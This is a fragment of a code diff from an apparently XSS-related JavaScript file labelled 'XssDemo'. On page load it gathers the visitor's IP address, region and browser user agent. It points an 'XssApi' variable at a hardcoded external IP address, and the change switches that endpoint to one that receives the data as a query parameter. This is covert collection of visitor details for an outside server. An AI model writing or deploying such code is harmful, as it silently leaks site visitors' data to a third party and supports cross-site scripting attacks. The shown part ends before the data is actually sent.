@@ -14,8 +14,8 @@ var returnCitySN = {"cip":"undefined", "cname":"undefined"};
 ImportJs("https://pv.sohu.com/cityjson?ie=utf-8");
 
 window.onload=function(){
-	let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp";
-	//let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp?data=";
+	//let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp";
+	let XssApi = "http://107.151.144.205/include/XssDemo/DataRecv.asp?data=";
 	let ip = returnCitySN["cip"];
 	let region = returnCitySN["cname"];
 	let ua = navigator.userAgent;
